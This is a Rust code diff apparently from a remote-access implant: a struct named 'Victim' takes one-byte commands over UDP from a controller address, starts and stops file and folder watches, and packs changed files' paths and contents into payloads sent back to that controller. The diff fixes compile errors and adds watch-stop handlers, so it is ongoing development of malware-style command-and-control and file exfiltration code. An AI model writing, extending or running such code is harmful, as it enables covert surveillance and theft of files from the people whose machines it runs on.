@@ -334,7 +334,7 @@ impl Victim {
         }
 
         if !cmd.is_empty() && cmd.as_bytes()[0] == 0x71 {
-            self.handle_file_watch_start(&cmd.as_bytes()[1..], udp, cmd_addr)?;
+            self.handle_watch_start(&cmd.as_bytes()[1..], udp, cmd_addr)?;
             return Ok(());
         }
 
@@ -344,7 +344,7 @@ impl Victim {
         }
 
         if !cmd.is_empty() && cmd.as_bytes()[0] == 0x75 {
-            self.handle_folder_watch_start(&cmd.as_bytes()[1..], udp, cmd_addr)?;
+            self.handle_watch_start(&cmd.as_bytes()[1..], udp, cmd_addr)?;
             return Ok(());
         }
 
@@ -639,7 +639,7 @@ impl Victim {
                                                 file_payload.extend_from_slice(relative.as_bytes());
                                                 file_payload.extend_from_slice(&data);
                                                 
-                                                let subtype = if event.kind == EventKind::Create(_) {
+                                                let subtype = if matches!(event.kind, EventKind::Create(_)) {
                                                     FOLDER_WATCH_FILE_CREATE
                                                 } else {
                                                     FOLDER_WATCH_FILE_UPDATE
@@ -689,6 +689,25 @@ impl Victim {
 
         Ok(())
     }    
+
+    // Add this method for file watch stop
+    fn handle_file_watch_stop(&mut self, _payload: &[u8]) {
+        if let Some(tx) = self.file_watch_stop_tx.take() {
+            let _ = tx.send(());
+        }
+        self.file_watch_active = false;
+        self.file_watch_path = None;
+    }
+
+    // Add this method for folder watch stop
+    fn handle_folder_watch_stop(&mut self, _payload: &[u8]) {
+        if let Some(tx) = self.folder_watch_stop_tx.take() {
+            let _ = tx.send(());
+        }
+        self.folder_watch_active = false;
+        self.folder_watch_path = None;
+    }
+
     fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
                      ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {
         let content_str = String::from_utf8_lossy(content);
